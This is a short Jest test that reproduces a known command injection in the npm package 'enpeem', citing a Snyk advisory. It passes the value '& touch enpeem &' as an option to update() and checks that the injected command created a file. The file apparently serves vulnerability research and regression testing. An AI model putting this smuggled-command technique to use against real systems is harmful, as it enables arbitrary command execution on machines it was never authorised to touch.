//https://snyk.io/vuln/SNYK-JS-ENPEEM-559007
test("Command Injection in enpeem", () => {
  const root = require("enpeem");
  const fs = require("fs");
  const path = "./enpeem";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch enpeem &";
  let opts = { production: attack_code };
  root.update(opts, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
